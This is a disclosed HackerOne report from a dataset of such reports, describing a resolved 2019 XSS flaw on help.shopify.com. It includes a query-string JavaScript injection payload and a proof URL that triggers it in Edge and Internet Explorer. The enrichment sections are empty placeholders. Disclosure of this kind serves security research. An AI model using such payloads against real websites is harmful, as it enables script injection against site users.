---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '564196'
original_report_id: '564196'
title: help.shopify.com Cross Site Scripting
weakness: Cross-site Scripting (XSS) - Stored
team_handle: shopify
created_at: '2019-05-03T15:32:35.669Z'
disclosed_at: '2019-05-12T17:36:09.574Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 69
asset_identifier: '*.shopify.com'
asset_type: WILDCARD
max_severity: medium
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# help.shopify.com Cross Site Scripting

## Metadata

- HackerOne Report ID: 564196
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: shopify
- Disclosed At: 2019-05-12T17:36:09.574Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello Security Team. 

Tested windows 10 and edge (Microsoft Edge 44.17763.1.0) , internet explorer

Test Url : https://help.shopify.com/it/partners/resources/marketing-pack-for-accountants

Payload: ?v0sjx'-alert(1)-'uyvvr=1

Proof Url: <https://help.shopify.com/it/partners/resources/marketing-pack-for-accountants?v0sjx'-alert(1)-'uyvvr=1>

Open Url: edge , internet explorer , click me "Condividi il tuo feedback. "

## Impact

https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
